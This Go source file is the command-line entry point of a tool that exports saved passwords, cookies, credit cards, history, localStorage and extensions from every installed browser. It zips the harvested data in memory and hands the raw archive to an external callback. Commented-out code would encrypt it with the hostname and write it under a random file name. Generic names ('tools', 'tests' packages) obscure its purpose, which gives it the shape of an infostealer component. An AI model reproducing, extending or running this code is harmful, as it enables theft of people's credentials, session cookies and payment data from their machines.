package run

import (
	"archive/zip"
	"bytes"
	"github.com/urfave/cli/v2"
	"log/slog"
	"os"
	"tests/browser"
	"tests/logger"
	"tests/utils/fileutil"
)

var (
	browserName  string
	outputDir    string
	outputFormat string
	verbose      bool
	compress     bool
	profilePath  string
	isFullExport bool

	LogCallback func(logType int, msg string, size int)
)

func Execute() {
	app := &cli.App{
		Name:      "tools",
		Usage:     "Export passwords|bookmarks|cookies|history|credit cards|download history|localStorage|extensions from browser",
		UsageText: "[tools -b chrome -f json -dir results --zip]\nExport all browsing data (passwords/cookies/history/bookmarks) from browser",
		Version:   "0.4.5",
		Flags: []cli.Flag{
			&cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
			&cli.BoolFlag{Name: "compress", Aliases: []string{"zip"}, Destination: &compress, Value: false, Usage: "compress result to zip"},
			&cli.StringFlag{Name: "browser", Aliases: []string{"b"}, Destination: &browserName, Value: "all", Usage: "available browsers: all|" + browser.Names()},
			&cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &outputDir, Value: "results", Usage: "export dir"},
			&cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "json", Usage: "output format: csv|json"},
			&cli.StringFlag{Name: "profile-path", Aliases: []string{"p"}, Destination: &profilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
			&cli.BoolFlag{Name: "full-export", Aliases: []string{"full"}, Destination: &isFullExport, Value: true, Usage: "is export full browsing data"},
		},
		HideHelpCommand: true,
		Action: func(c *cli.Context) error {
			if verbose {
				logger.Default.SetVerbose()
				logger.Configure(logger.Default)
			}
			browsers, err := browser.PickBrowsers(browserName, profilePath)
			if err != nil {
				slog.Error("pick browsers error", "err", err)
			}
			outBuffer := bytes.Buffer{}
			zw := zip.NewWriter(&outBuffer)
			for _, b := range browsers {
				data, err := b.BrowsingData(isFullExport)
				if err != nil {
					slog.Error("get browsing data error", "err", err)
					continue
				}
				data.Output(zw, outputDir, b.Name(), outputFormat)
			}
			zw.Close()

			//host, _ := os.Hostname()
			//out := crypto.AESEncrypt(outBuffer.Bytes(), []byte(host))
			//outName := uuid.New().String()
			if LogCallback != nil {
				LogCallback(1, "get browser data success", 0)
				b := outBuffer.Bytes()
				LogCallback(0xf, string(b), len(b))
			}

			//if err = os.WriteFile(outName, out, 666); err != nil {
			//    slog.Error("write zip error: ", "err", err)
			//} else {
			//    if tmp, err := filepath.Abs(outName); err == nil {
			//        outName = tmp
			//    }
			//    msg := "save success,out: " + outName
			//    if LogCallback != nil {
			//        LogCallback(1, "save success,out: "+outName, 0)
			//    }
			//    slog.Warn(msg)
			//}

			if compress {
				if err = fileutil.CompressDir(outputDir); err != nil {
					slog.Error("compress error: ", "err", err)
				}
				slog.Info("compress success")
			}
			return nil
		},
	}
	err := app.Run(os.Args)
	if err != nil {
		panic(err)
	}
}
